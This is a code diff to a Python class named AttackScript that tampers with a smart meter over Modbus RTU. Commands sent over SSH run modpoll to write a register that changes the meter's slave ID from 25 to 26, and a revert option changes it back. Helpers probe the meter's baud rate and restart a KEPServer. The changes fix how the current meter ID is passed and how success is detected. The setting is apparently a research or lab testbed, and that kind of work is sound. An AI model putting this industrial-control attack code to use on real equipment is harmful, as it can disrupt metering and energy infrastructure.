@@ -527,22 +527,26 @@ class AttackScript:
         """
         executable_path = self.MODPOLL_PATH + r"\modpoll.exe"
         
+        current_meterID = "25"
         meterID_to_change = "26"
+
         if revert:
+            current_meterID = "26"
             meterID_to_change = "25"
 
-        baudrate = self.baudrate_check()
+        baudrate = self.baudrate_check(current_meterID)
+
         if baudrate == "0":
             raise Exception("Unable to connect to SmartMeter")
         
-        parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "201", "COM1", meterID_to_change]
+        parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", current_meterID, "-1", "-r", "201", "COM1", meterID_to_change]
 
         # FIXME: Try except for running the executable is gone
         modpoll_output = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
         print(modpoll_output)
 
         self.kep_server_start()
-        if "[201]:" in modpoll_output:
+        if "Written" in modpoll_output:
             print(f"Successfully changed meter ID to {meterID_to_change}")
         else:
             raise Exception(f"Unable to change meter ID to {meterID_to_change}")
@@ -641,7 +645,7 @@ class AttackScript:
         self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
         self.kep_server_start()
 
-    def baudrate_check(self) -> str:
+    def baudrate_check(self, meter_id="25") -> str:
         """
         Run modpoll to check the baudrate - Register 40206
         """
@@ -653,7 +657,7 @@ class AttackScript:
         baudrate_list = ["4800", "9600", "19200"]
 
         for baudrate in baudrate_list:
-            parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "-1", "COM1"]
+            parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", meter_id, "-r", "206", "-1", "COM1"]
             baudrate_output = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
             print(f"Checking baudrate {baudrate}:")
 
